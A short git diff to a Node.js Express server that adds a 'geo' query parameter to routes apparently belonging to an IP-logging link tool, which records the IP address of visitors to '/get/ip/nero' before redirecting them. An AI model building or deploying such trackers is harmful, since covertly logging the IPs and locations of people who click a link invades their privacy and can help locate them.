@@ -6,7 +6,7 @@ const express = require("express");
 const port = process.env.PORT || 3000;
 const TOKEN = process.env.LINE_TOKEN;
 const bitly_token = process.env.BITLY_TOKEN;
-let lock = false, random = 400, original = '', push_status = false;
+let lock = false, random = 400, original = '', push_status = false, geo = '';
 
 const app = express();
 
@@ -105,7 +105,7 @@ app
   })
   .get("/get/ip/nero", (req, res) => {
     const nom = req.query.name, id = req.query.id;
-    original = req.query.original;
+    geo = req.query.geo; original = req.query.original;
     res.sendFile(__dirname + '/open.html');
     // get ip
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
@@ -128,7 +128,7 @@ app
   })
   .get("/auth", (req, res) => {
     const URL = original || "https://rhipsali.github.io/get_ip";
-    res.send(JSON.stringify({url: URL}));
+    res.send(JSON.stringify({url: URL, geo: geo}));
   })
   .listen(port, () => console.log("listening on " + port))
 ;
